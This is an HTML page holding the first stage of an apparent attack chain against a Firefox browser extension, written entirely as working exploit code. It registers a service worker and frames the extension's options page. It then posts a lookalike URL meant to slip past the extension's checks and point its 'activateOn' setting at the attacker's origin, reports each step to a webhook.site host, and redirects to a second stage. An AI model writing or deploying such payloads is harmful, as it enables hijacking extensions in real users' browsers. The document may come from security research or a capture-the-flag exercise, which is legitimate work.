<!DOCTYPE html>
<html>
<head><title>Stage 1</title></head>
<body>
  <script>
    async function run() {
      // 1. Register SW
      await navigator.serviceWorker.register('/sw.js', { scope: '/' });
      await navigator.serviceWorker.ready;

      if (!navigator.serviceWorker.controller) {
        await new Promise(r => navigator.serviceWorker.addEventListener('controllerchange', r, { once: true }));
      }

      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_ready', { keepalive: true });

      // 2. Open options iframe
      const iframe = document.createElement('iframe');
      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {
        // Send string URL that passes options.js checks & sets activateOn to our origin!
        const payload = 'https://doc.rust-lang.org.serverpit.com/#https://doc.rust-lang.org/';
        iframe.contentWindow.postMessage(payload, '*');

        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_hijacked', { keepalive: true });

        setTimeout(() => {
          window.location.href = '/stage2.html';
        }, 2000);
      };
    }
    run();
  </script>
</body>
</html>
